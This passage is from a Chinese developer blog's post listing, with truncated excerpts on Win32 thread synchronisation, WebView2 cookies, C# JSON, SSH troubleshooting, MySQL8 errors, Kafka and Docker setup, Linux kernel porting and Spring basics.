使用关键代码段 注意：必须所有访问这个共享资源的线程都使用相同的规则，即都使用关键代码段进行保护，才能达到效果。如果Thread1使用了关键代码段进行了保护，但是Thread2没有使用关键代码段进行保护，直接访问了g_alDataList, 也不能达到保护的目的 每个共享资源使用一个LPCRITICAL_SECTION变量。比如有两个共享资源a,b, Thread1只需要访问a就可以，Thread2 和 Thread3 需要访问a, b, 则a和b使用不同的LPCRITICAL_SECTION变量 同时访问多个共享资源，不同的线程按照相同的顺序进入和离开关键代码段 不要长时间运行关键代码段，否则其他线程进入等待状态。会降低应用程序的性能 使用互锁函数和关键代码段的缺点 互锁函数只能对单值变量进行操作，不能对结构体等其他复杂结构进行操作 关键代码段只能在同一个进程之中的线程间保持同步 Critical Section不是一个核心对象，无法获知进入临界区的线程是生是死 不要长时间锁住一份资源。这里的长时间是相对的，视不同程序而定。对一些控制软件来说，可能是数毫秒，但是对另外一些程序来说，可以长达数分钟。但进入临界区后必须尽快地离开，释放资源 使用内核对象进行同步的机制的适应性远远优于用户方式的线程同步 使用内核对象进行同步控制 Win32的各种内核对象如Mutex,Semaphore,Event等，这些内核对象都有两种状态“已通知”和”未通知”
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/81e83516ee80c04ec1f9f842125edb6b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9a00809077c195cf69737d895a581f99/" rel="bookmark">
			WPF使用WebView2实现带Cookie数据访问链接
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		WPF如何使用WebView2浏览器（以Microsoft Edge为内核）实现访问链接时带Cookie数据呢？
关于WebView2的基础知识这里不展开讲述，各位可以自行查阅相关资料了解一下。接下来直奔主题，
实现的整体流程：
CoreWebView2对象初始化→设置Cookie→访问链接。
这里核心的是需要使用到WebView2的CoreWebView2对象。关于CoreWebView2的官方简述：
摘要：访问底层Microsoft.Web.WebView2.Core.CoreWebView2的完整功能 COM API。在初始化完成之前返回null。请参见Microsoft.Web.WebView2.Wpf.WebView2初始化概述的类文档。 避坑指南
CoreWebView2的初始化与其他普通类的初始化大不相同，其他普通类常见的初始化方式为：ClassA a=new ClassA();
但它的初始化需做2项工作：
调用WebView2的EnsureCoreWebView2Async(CoreWebView2Environment environment);方法，代码示例如后文；使用NuGet程序包管理下载安装运行库WebView2.Runtime.X64或者WebView2.Runtime.X86（使用X64还是X86运行库请结合自己的项目情况），并将运行库的WebView2文件夹拷贝到程序运行目录（与运行程序位于同级目录）。
运行库中的WebView2文件夹位置（文件夹相对位置：{项目文件夹}\packages\WebView2.Runtime.X64.114.0.1823.79\contentFiles\any\any\WebView2），如下图。
将运行库的WebView2文件夹拷贝到程序运行目录（与运行程序位于同级目录），如下图。
初始化完成之后，再进行Cookie创建和设置，最后访问目标链接地址。完整代码示例如下（其中webView为WebView2的实例化对象）：
private async void LinkWindow_Loaded(object sender, RoutedEventArgs e) { try { await webView.EnsureCoreWebView2Async(await CoreWebView2Environment.CreateAsync( System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "WebView2"))); string url = "http://192.168.10.10:8080"; string cookieUrl = "http://192.168.10.10:8080"; string cookieDomain = "192.168.10.10"; string cookieName = "MyCookie"; string cookieValue= "this is cookie value"; if (webView.CoreWebView2 == null) { Log.Error("webView.CoreWebView2对象为null"); return; } var cookieObj = webView.CoreWebView2.CookieManager.CreateCookie(cookieName, cookieValue, cookieDomain, "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9a00809077c195cf69737d895a581f99/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d10260075344706e46561072028098af/" rel="bookmark">
			c#中string字符串转为json对象
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		string转json //字符串转json public static void strJson() { string jsonText = "{"shenzheng":"深圳","beijing":"北京","shanghai":[{"zj1":"zj11","zj2":"zj22"},"zjs"]}"; JObject jo = (JObject)JsonConvert.DeserializeObject(jsonText);//或者JObject jo = JObject.Parse(jsonText); string zone = jo["shenzheng"].ToString();//输出 "深圳" string zone_en = jo["shanghai"].ToString();//输出 "[{"zj1":"zj11","zj2":"zj22"},"zjs"]" string zj1 = jo["shanghai"][1].ToString();//输出 "zjs" Console.WriteLine(jo); } 对象与数组转JSON //对象与数组转JSON public static void GetJsonString() { //初始化对象 Obj product = new Obj() { Name = "苹果", Price = 5.5 }; //序列化 string o = new JavaScriptSerializer().Serialize(product);//值："{\"Name\":\"苹果\",\"Price\":5.5}" //数组转json List&lt;Obj&gt; products = new List&lt;Obj&gt;(){ new Obj(){Name="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d10260075344706e46561072028098af/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1748c6b41ea4898647d14dc318143345/" rel="bookmark">
			php项目内存飚高处理与优化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		公司服务器最近内存占用超过阈值一直报警
经过排查,内存占用很多，剩余很少
free -m 排查代码无太多冗余和缓存
最后和运维一起排查，发现宝塔安装后带的gitlab的进程很吃内存，赶紧停用，并卸载无用的软件
最后内存降下来了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/39bb8f58054a14d142d0f2f83e90906c/" rel="bookmark">
			解决SSH连接到主机端口22时出现“No route to host“错误的有效方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		介绍：
在使用SSH连接到主机的过程中，有时候可能会遇到"No route to host"的错误提示。这个问题可能是由于网络连接故障、主机防火墙设置问题或者其他原因导致的。本文将参考以下文章：https://www.howtouselinux.com/post/ssh-connect-to-host-port-22-no-route-to-host，详细介绍多种解决"No route to host"错误的方法，并且通过实际例子展示这些方法的有效性。
方法一：检查网络连接 首先，我们应该检查本地网络连接是否正常。可以使用ping命令测试主机的可达性。
ping host_ip_address 方法二：检查主机防火墙设置 有时候，主机防火墙的设置可能会阻止SSH连接。我们应该确认端口22是否已经开放。
方法三：检查路由表 检查路由表可以帮助我们找到网络路由问题。使用route命令来查看当前的路由表信息。
route 方法四：确认SSH服务是否运行 检查SSH服务是否正在运行，以及端口22是否已经在监听状态。
sudo systemctl status ssh 方法五：检查SSH配置文件 最后，我们可以检查SSH配置文件是否正确，确认是否有误配置导致问题。
总结： 当SSH连接到主机端口22出现"No route to host"错误时，可能是由于多种原因引起的。我们可以通过检查网络连接、主机防火墙设置、路由表、SSH服务状态以及SSH配置文件，逐步解决问题并找到正确的解决方案。
无论你是初学者还是有经验的Linux用户，掌握这些解决问题的方法将有助于提高你的故障排除能力和解决问题的效率。
最后，如果你想了解更多关于Linux命令和学习资源，我们整理了一份Linux学习的pdf文件，放在下面的路径，可以自提：
https://www.howtouselinux.com/post/linux-commands-for-linux-beginners-cheat-sheet
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1ddb56a85a7ba631019b0542aaab084b/" rel="bookmark">
			MySQL8 设置权限报错:ERROR 1396 (HY000)、ERROR 1064 (42000)、ERROR 1410 (42000)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题：
ERROR 1396 (HY000): Operation ALTER USER failed for 'root'@'%'
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'identified by 'MyAdmin123!@#'' at line 1
ERROR 1410 (42000): You are not allowed to create a user with GRANT D:\mysql-8.0.34-winx64\bin&gt;mysql -uroot -p Enter password: ************* Welcome to the MySQL monitor. Commands end with ; or \g.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1ddb56a85a7ba631019b0542aaab084b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ce80f664dbc47c966f8f09effd8133a3/" rel="bookmark">
			【干货分享】如何恢复SOLIDWORKS 零件、装配体和工程图模板？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当我们卸载了SOLIDWORKS或者是购买了一台新笔记本电脑或是丢失了一直在使用的模板时，我们可以通过打开过去的零件、装配体和工程图文件来恢复 SOLIDWORKS 模板。
▷ 零件模板
打开包含所需自定义属性的上一个部件。
保存零件的副本以避免对原始文件进行意外更改。
从零件中删除所有特征和草图。
确认自定义属性。
确认文档属性。
保存零件模板。
▷ 程序集模板
打开包含所需自定义属性的上一个程序集；保存程序集的副本以避免对原始文件进行意外更改。
从树中删除所有零件、子组件和组件特征。
确认自定义属性。 确认文档属性。
保存程序集模板。
▷ 图形模板
恢复图形模板时，请务必注意，图形模板和图纸格式是两个单独的选项，需要保存这两个选项以避免以后出现模板问题。
同样重要的是要记住，图形模板包括图纸格式、文档属性和自定义属性。以下是有关如何保存图形样板和图纸格式的说明。 打开包含所需格式和视图的上一个图形。 保存图形的副本，以避免对原始图形进行任何意外修改或更改。​
从图纸中删除所有工程视图。
从图纸中删除所有工程视图。
确认图纸格式具有所需信息。
退出编辑图纸格式。
保存图纸格式。
确认文档属性。
确认自定义属性。
保存图形样板。
申请SolidWorks正版试用https://www.evget.com/solution/appointtry
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6c59d983f17e22c21a00c00b9a2cf69c/" rel="bookmark">
			为什么 Python 是数据分析最受欢迎的语言？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		根据统计数据，随着各行各业的企业越来越依赖大数据分析，对数据分析专业人员的需求逐年增长。
事实上，这个最热门的职业有许多不同的学习途径，选择合适的职业取决于你在职业生涯中所处的位置。除了数学和统计学，编程专业知识也是数据分析专业人士的必备技能之一。
数据分析专业人员最常用的 3 种编程语言 正如一项调查结果所揭示的那样，Python 是最常用的编程语言，其次是 SQL 和 R。
该调查是对近 24000 名数据专业人员进行的，其中 3/4 的人员建议学习 Python 进行数据分析。在本文中，让我们找出是什么让 Python 成为数据专业人士中最受欢迎的编程语言，以及为什么选择 Python 进行数据分析。
为什么数据分析专业人员喜欢 Python？ 数据分析专业人员需要处理复杂的问题，问题解决过程基本上包括四个主要步骤——数据收集和清理、数据探索、数据建模和数据可视化。
Python 为他们提供了所有必要的工具。Python 带有强大的统计和数字库，如 Pandas，Numpy，Matplotlib，SciPy，scikit-learn 等，以及先进的深度学习库，如 Tensorflow，PyBrain 等。
此外，Python 已经成为 AI 和 ML 的默认语言。因此，这种通用语言是数据分析专业人员中最常用的编程语言也就不足为奇了。
现在，让我们看一下数据分析过程中涉及的步骤以及用于数据挖掘的 Python 包，这些应该是数据分析专业人员工具箱中不可或缺的一部分。
数据收集和清理 使用 Python，可以使用不同格式提供的数据，例如 CSV（逗号分隔值），TSV（制表符分隔值）或 Web 的 JSON。无论是想将 SQL 表直接导入代码中，还是需要抓取网站，Python 都可以帮助您轻松完成这些任务（如 PyMySQL 和 BeautifulSoup）。前者使您能够轻松连接 MySQL 数据库以执行查询和提取数据，而后者可帮助您读取 XML 和 HTML 类型数据。
数据探索 现在已经有了数据，需要根据业务问题，转换为数据分析问题。为此，需要识别数据属性并将它们分为不同的类型，例如数字、序数、分类等，以便更好的处理。一旦数据按类型分类，数据分析库 NumPy 和 Pandas 将通过允许你轻松有效地操作数据来帮助你从数据中找到答案。
数据建模 这是数据分析过程中一个非常关键的阶段，在这个阶段中，Python 有许多高级库，可帮助你利用机器学习的力量来执行数据建模中涉及的任务。只需使用 SciPy，可以轻松执行科学计算，Scikit-learn 可以提供直观的界面，并将机器学习算法应用于数据。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6c59d983f17e22c21a00c00b9a2cf69c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d1c325ed33f6c657f452acf787ba9380/" rel="bookmark">
			elementui el-table折叠表格，点击主表数据展开从表明细
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		用element-ui 的el-table实现：主表table可实现展开行显示关联的明细表table的列表数据，效果图如下
&lt;el-table ref="tableData" v-loading="listLoading" :data="tableData" row-key="id" border stripe highlight-current-row style="width: 100%" max-height="500" @row-click="handleRowClick" @expand-change="expandChange" &gt; &lt;el-table-column type="expand"&gt; &lt;template slot-scope="scope"&gt; &lt;el-table :data="scope.row.tableDetailData" size="mini" style="width: 95%;margin-left: 8%;"&gt; &lt;el-table-column prop="spotCheckItems" label="点检项目" align="center" /&gt; &lt;el-table-column prop="spotCheckPattern" label="点检类型" align="center" :formatter="formatterSpotCheckPattern" /&gt; &lt;el-table-column prop="results" label="点检结果" align="center" :formatter="formatterResults" /&gt; &lt;el-table-column prop="createTime" label="点检日期" align="center" /&gt; &lt;/el-table&gt; &lt;el-col :span="24" class="toolbar"&gt; &lt;el-pagination style="float: right" :total="scope.row.detailTotal" :current-page="detailCurrentPage" :page-sizes="[5, 10, 20, 30]" :page-size="detailPageSize" layout="total, sizes, prev, pager, next, jumper" @size-change="handleDetailSizeChange" @current-change="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d1c325ed33f6c657f452acf787ba9380/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3eb3ec3f5027f94a1aa5bb2772e0607b/" rel="bookmark">
			云服务器使用docker-compose安装kafka
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		查了一些资料，终于改好了，整理一下发出来，记录一下，希望能帮到遇到问题的人
容器选择 本次使用bitnami/kafka，其实他们文档已经写得挺清楚了，但是我也是改了一段时间才改完，希望能方便不想看文档的兄弟们
docker-compose.yml 文件中除了宿主机外网ip需要改，其他地方基本不需要改
version: '3.0' services: zookeeper: image: 'bitnami/zookeeper:latest' ports: - '2181:2181' environment: # 匿名登录 - ALLOW_ANONYMOUS_LOGIN=yes # volumes: # - ./zookeeper:/bitnami/zookeeper kafka: image: 'bitnami/kafka:2.8.0' ports: - '9092:9092' environment: # 配置broker id - KAFKA_BROKER_ID=1 # 配置监听者的安全协议 - KAFKA_CFG_LISTENER_SECURITY_PROTOCOL_MAP=INTERNAL:PLAINTEXT,OUTSIDE:PLAINTEXT # 定义Kafka Broker的Listener的配置项，配置外部访问和内部访问 - KAFKA_CFG_LISTENERS=INTERNAL://:9093,OUTSIDE://:9092 # 将Broker的Listener信息发布到Zookeeper中，供Clients（Producer/Consumer）使用 - KAFKA_CFG_ADVERTISED_LISTENERS=INTERNAL://kafka:9093,OUTSIDE://宿主机外网ip:9092 - KAFKA_CFG_INTER_BROKER_LISTENER_NAME=INTERNAL - KAFKA_CFG_ZOOKEEPER_CONNECT=zookeeper:2181 - ALLOW_PLAINTEXT_LISTENER=yes - KAFKA_CFG_AUTO_CREATE_TOPICS_ENABLE=true # 全局消息过期时间 - KAFKA_CFG_LOG_RETENTION_HOURS=6 # volumes: # - ./kafka:/bitnami/kafka depends_on: - zookeeper 内外网隔离配置 KAFKA_CFG_LISTENER_SECURITY_PROTOCOL_MAP：监听器名称和安全协议的映射配置。每个监听器的名称只能在map中出现一次。KAFKA_CFG_INTER_BROKER_LISTENER_NAME:用于配置broker之间通信使用的监听器名称KAFKA_CFG_LISTENERS:用于配置broker监听的URI以及监听器名称列表KAFKA_CFG_ADVERTISED_LISTENERS:将该地址发布到zookeeper供客户端使用
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3eb3ec3f5027f94a1aa5bb2772e0607b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/662260c1cd60a30a56e36557edb267d6/" rel="bookmark">
			Mysql操作多表查询
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		多表查询是指在关系型数据库中，通过同时查询多个数据表来检索相关数据的操作。这种查询方式通常用于需要在多个数据表中搜索和比较数据的情况，以获取更完整和准确的结果。
在多表查询中，使用联接（join）操作将多个表连接在一起，并使用条件语句来指定要检索的数据。联接操作可以使用不同的方式进行，包括内部联接、外部联接、左联接、右联接等，这些方式可以根据查询需求选择不同的联接方式。
多表查询可以提高查询效率，避免重复的数据输入，并且可以根据需要获取更详细的查询结果。不过，在进行多表查询时，需要注意数据库表之间的关系、数据类型和查询条件等因素，以确保查询结果的准确性和完整性。
举个例子，如果我们需要查询一篇文章的作者姓名和发表时间，那么这个信息通常会被保存在不同的两个表中，一张表存储文章的信息，包括文章标题、内容等；另一张表存储作者的信息，包括姓名、ID等。在这种情况下，如果只查询文章表，我们只能获取文章的基本信息，无法获得作者的信息；但如果使用多表查询，我们就可以将两个表联接起来，获取文章的作者信息，从而得到更全面和详细的查询结果。
多表查询基本写法 -- 从两张表中查询数据 select * from A, B; -- 从两张表中查询数据 select * from A join B; TIPS:
其实，连接两张表进行查询，标准SQL采用的是join的语法。上述的select * from A, B;的写法，其实只是在MySQL中的“方言”，只在MySQL中生效，在其他的DBMS中就不一定能使用了。
select * from A, B; 其实是等价于 select * from A inner join B; 的。那么什么是inner join呢？后面会讲。
笛卡尔积 在做连接查询的时候，一张表中的每一行数据都会和另一张表中的每一行数据进行关联，形成笛卡尔积。
假如A表中有m行数据，B表中有n行数据，连接查询之后的结果就是m*n行数据，其中有太多的数据是我们不需要的了。
连接查询条件限制 通过上图，我们知道了在两张表进行连接查询的时候，会出现大量的无效的数据。因此，我们就需要通过一些操作，去除连接查询之后的无用的数据，只得到我们需要的数据！而这个过程是可以通过条件的限制来实现的:
MySQL的查询方言
-- 用where进行条件的过滤，得到满足条件的所有的数据。 select * from A, B where A.empno = B.mgr; 标准SQL的语法
-- 用on的方式，进行连接查询的多余数据过滤 select * from A join B on A.empno = B.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/662260c1cd60a30a56e36557edb267d6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/799ddb1162f8e6422846424cfdf85348/" rel="bookmark">
			2023年VSCode插件最新推荐（54款）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文介绍前端开发领域常用的一些VSCode插件，插件是VSCode最重要的组成部分之一，本文列出了我自己在以往工作经验中积累的54款插件，个人觉得这些插件是有用或有趣的，根据它们的作用，我粗略的把它们分成了代码管理、文本和图片处理、前端框架和语言相关、提效和功能增强以及主题和图标等几个模块。
一、代码管理相关的插件 01、GitLens — Git supercharged
该插件增强了 VS Code 中的 Git，通过丰富的可视化和强大的命令帮助我们无缝导航和探索Git存储库。可以快速查看代码的编写者、轻松导航和探索 Git 存储库、通过丰富的可视化效果和强大的比较命令获取有效信息，以及执行更多操作，帮助我们更好地理解代码。
02 、Git Craph
Git Graph 插件用于可视化查看存储库的 Git 操作，并从图形中轻松执行Git操作。类似于SOurceTree的可视化版本控制插件，可以更新、提交代码，查看提交记录，审视代码。
03 、Git History
该插件用于查看 Git 日志和文件历史记录并比较分支或提交。
04 、Project Manager
该插件可以帮助我们方便的管理多个项目，支持快速的在多个项目间切换工程，如果你在日常开发中需要进行多项目的管理那用它就对了。
05 、Todo Tree
这个扩展可以帮助我们在工程中快速搜索TODO注释标签，并将它们显示在活动栏的树状图中，视图可以从活动栏中拖到资源管理器窗格中（或您希望的其他位置）。单击树中的TODO将打开文件，并将光标放在包含TODO的行上，找到的TODO也可以在打开的文件中突出显示。
06 、Waka Time
WakaTime是一个开源的VS代码插件，用于在编程活动中自动统计工作量、代码提交和时间跟踪等，并能为我们定期提供各种高质量的工作统计图表。
在使用的实际过程中，我们可以通过自己的Github账号来登录WakaTime，下面的这些开发工具都支持我们快速的使用该扩展。
07 、VS Code Counter
该插件用于帮助我们统计项目代码的行数，安装插件后，先选中需要进行代码统计的代码文件夹，然后鼠标右键点击唤出菜单，选择“Count lines in directory”，该扩展就是自动生产一个 .VSCodeCounter 的文件夹。
在.VSCodeCounter文件夹中包含了不同格式的结果，编辑器会打开其中的的 .md 格式。结果中会显示代码总行数，不同格式文件行数，不同路径文件函数等。代码行数中有纯代码行数、空白行数、注释行数。
08 、Notes
该插件用于帮助我们通过VSCode来创建Markdown格式的笔记文件，并方便的对这些文件进行管理，我个人的使用体验还是不错的。建议大家可以搞一个github的仓库并结合Notes扩展来管理自己的笔记，可以很方便的工作中实现文档和代码切换(同时)工作，也方便追溯。
09 、Timer Master
该插件用于从编程活动中自动生成的指标、见解和时间跟踪。它是一个开源项目，独立于网络环境，安全轻量。
二、前端框架和语言相关插件 01、ES7 React/Redux/GraphQL/React-Native snippets
该插件提供了许多速记前缀来加速开发并帮助开发人员为 React、Redux和 React Native 创建代码片段和语法。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/799ddb1162f8e6422846424cfdf85348/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c6ecc2dcee3e1260d7aa63cdb4d110e0/" rel="bookmark">
			键盘输入一个字符串保存到char类型的数组中，然后输入一个字符，把这个字符从字符串里面全部删除
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		代码1： #include &lt;stdio.h&gt; #include &lt;stdbool.h&gt; #include &lt;string.h&gt; char p1[20]; char p2[20]; int main(void) { char *p; char *o; char delete; int len; p=p1; o=p2; scanf("%s",p1); getchar(); scanf("%c",&amp;delete); while(*p!='\0') { printf("%c",*p++); } printf("\n"); p=p1; while(*p!='\0') { if(delete!=*p) { *o=*p; *o++; } *p++; } memset(p1, 0, sizeof p1); p=p1; o=p2; while(*o!='\0') { *p=*o; *o++; *p++; } p=p1; while(*p!='\0') { printf("%c",*p++); } } 代码2： #include &lt;stdio.h&gt; #include &lt;stdbool.h&gt; #include &lt;string.h&gt; #include &lt;malloc.h&gt; int main(void) { char *p=(char *)malloc(sizeof(char)*10); char delete; int log=0; int location; char p1[20]={0}; p=p1; printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c6ecc2dcee3e1260d7aa63cdb4d110e0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f71ac1fb5f7b59ad3f141e93eee21533/" rel="bookmark">
			Docker之使用Dockerfile创建新镜像
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、Docker镜像简介 Docker镜像是Docker容器的基础，可以理解为是一个只读的模板，包含了运行Docker容器所需的所有文件、配置和依赖关系。镜像可以从一个或多个Dockerfile构建而来，也可以从其他镜像构建而来。Docker镜像可以被存储、分享和重复使用，可以在不同的环境中部署相同的应用程序，从而实现快速、可靠的部署。Docker Hub是一个公共的镜像仓库，包含了数以万计的Docker镜像，开发者可以在其中找到自己需要的镜像，并在自己的项目中使用它们。
创建docker镜像主要有如下四种方式：
从已有的镜像创建：可以使用docker pull命令从Docker Hub或其他镜像仓库中拉取镜像，然后使用docker run命令创建容器。使用Dockerfile创建：Dockerfile是一个文本文件，包含了一系列指令，用于构建Docker镜像。可以使用docker build命令根据Dockerfile创建镜像。从容器创建：可以使用docker commit命令从一个运行中的容器创建一个新的镜像。使用外部文件创建：可以使用docker import命令从一个本地文件或远程URL创建一个新的镜像。 博文实验内容是介绍使用Dockerfile文件创建新镜像，博文实验环境信息如下：
操作系统：centos7.9docker版本：23.0.1docker基础镜像：Ubuntu22.04NGINX软件版本：1.18.0 二、创建步骤 1、镜像源说明 运行一个Ubuntu基础镜像容器，登录后我们可以确认，基础镜像中继没有wget命令，也没有查看ip地址的命令，也没有NGINX命令，时区是UTC时区。接来下我们将基于Ubuntu基础镜像，通过dockerfile的方式创建一个包含nginx并包含wget和ip addr命令的镜像文件。并给镜像设置时区为中国上海的时区。
[root@yws55 ~]# docker run -itd --name utest ubuntu:latest
c4b4e6b8e891a489f0a0c60737ce34e6a4accf13adbe4b64915ee95b915d59c9
[root@yws55 ~]# docker --version
Docker version 23.0.1, build a5ee5b1
[root@yws55 ~]# docker exec -it utest /bin/bash
root@c4b4e6b8e891:/# which wget
root@c4b4e6b8e891:/# ip addr
bash: ip: command not found
root@c4b4e6b8e891:/# nginx -t
bash: nginx: command not found
root@c4b4e6b8e891:/# date
Thu Jun 8 06:52:14 UTC 2023
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f71ac1fb5f7b59ad3f141e93eee21533/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae2bb96b32e98a01a17b4b82a8097755/" rel="bookmark">
			Inno Setup 制作安装包中一些常用的知识点 新手教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、Inno Setup 是什么？ Inno Setup 是一个免费的 Windows 安装程序制作软件。第一次发表是在 1997 年，Inno Setup 今天在功能设置和稳定性上的竞争力可能已经超过一些商业的安装程序制作软件。
Inno Setup 关键功能: ★ 支持现在所有正在使用的 32 位 Windows 版本: Windows 95，98，2000，Server 2003，XP，Me，NT 4.0 (不需要服务包)。
★ 支持创建单个 EXE 格式的安装程序，使你的程序可以很方便地在网络上发表。同时也支持磁盘延伸。
★ 标准的 Windows 2000/XP 样式向导界面。
★ 定制安装类型，例如：完整安装，最小安装，自定义安装。
★ 完整的卸载功能。
★ 文件安装：包括完全的“压缩”支持，bzip2 和 7-Zip LZMA 文件压缩。安装程序可以比较文件版本信息，替换正在使用的文件，使用共享文件计数，注册 DLL/OCX 和类型库，以及安装字体。
★ 可以在任意地方创快捷方式建，包括开始菜单和桌面。
★ 创建注册表和 .INI 项目。
★ 完整的 Pascal 脚本引擎。
★ 支持 multilingualLanguagessection 安装。
★ 支持密码和加密安装。
★ 后台安装和后台卸载。
★ 全部源代码公开 (Borland Delphi 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ae2bb96b32e98a01a17b4b82a8097755/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f9d45aaa0ece0fe735dd7fc8e7b14420/" rel="bookmark">
			NMOS管和PMOS管使用区别之一
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用的位置
NMOS管在电路中常做下管使用，PMOS管在电路中常做上管使用。
VCC叫上，GND叫下。
NMOS管在电路中常做下管使用：S端接GND,D端接负载,负载再接VCC.
PMOS管在电路中常做上管使用：S端接VCC,D端接负载,负载再接GND.
无论做上管还是下管，S极都接电源（VCC和GND都称为电源）
电流的方向是逆着体二极管方向.
另外 如何区分NMOS和PMOS，只需要看箭头，箭头指向G则是NMOS,
箭头从G指出来则是PMOS
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bed8f019d61bea9cf04ea8cb8b83172a/" rel="bookmark">
			STM32MP157A之Linux内核与根文件系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		（一）Linux内核移植步骤 Linux 内核源代码非常庞大，随着版本的发展不断增加。它使用目录树结构，并且使用Makefile 组织配置编译
3.1》导入源码 1）打开系统源码，进入linux的源码目录下,该目录下以 patch 结尾的文件为 ST 官方提供的补丁文件；linux-5.4.31.tar.xz为标准linux源码包。
/home/linux/fs_mp157a/kernel/stm32mp1-openstlinux-5.4-dunfell-mp1-20-06-24/sources/arm-ostl-linux-gnueabi/linux-stm32mp-5.4.31-r0
2）解压linux内核源码，并且进入解压后的源码目录下
tar -xvf linux-5.4.31.tar.xz
cd linux-5.4.31/
（********注意：接下来所有的操作都将在此目录下，不要走错了地方。）
3.2》添加 STMicroelectronics 官方补丁 1）解压 linux 内核源码后得到的是 Linux 社区的标准内核源码，接下来需要将 ST 官方提供的源码补丁添加到标准内核中。
for p in ls -1 ../*.patch; do patch -p1 &lt; $p; done
3.3》生成标准板配置文件 1）生成 multi_v7_defconfig 默认配置
make ARCH=arm multi_v7_defconfig “fragment*.config”
2）在默认 multi_v7_defconfig 配置中加入 ST 官方提供的 fragment config //执行以下两条指令
for f in ls -1 ../fragment*.config; do scripts/kconfig/merge_config.sh -m -r .config $f; done yes ‘’ | make ARCH=arm oldconfig 3）生成自己的默认配置文件
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bed8f019d61bea9cf04ea8cb8b83172a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4f4b17fe7cc23de3abd9b271025e8fe3/" rel="bookmark">
			Spring基础知识讲解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 Spring是什么？IoC容器与DIDI与IoC的区别 Spring项目的创建配置maven国内源创建Spring项目有关Bean的操作存储Bean使用Bean ApplicationContext和BeanFactory的区别getBean()的三种使用方法 更简单的存储和获取对象类注解方法注解获取Bean对象的简单方法——依赖注入@Autowired和@Resource的区别 Bean的作用域和生命周期作用域设置作用域生命周期Bean的执行流程Bean的生命周期 Spring是什么？ Spring指的是Spring Framework(Spring框架)，它是一个开源框架，有非常活跃和庞大的社区支持，Spring支持广泛的应用场景，可以让Java企业级开发更简单。Spring是包含众多工具方法的IoC容器，Spring最核心的功能就是容器管理。
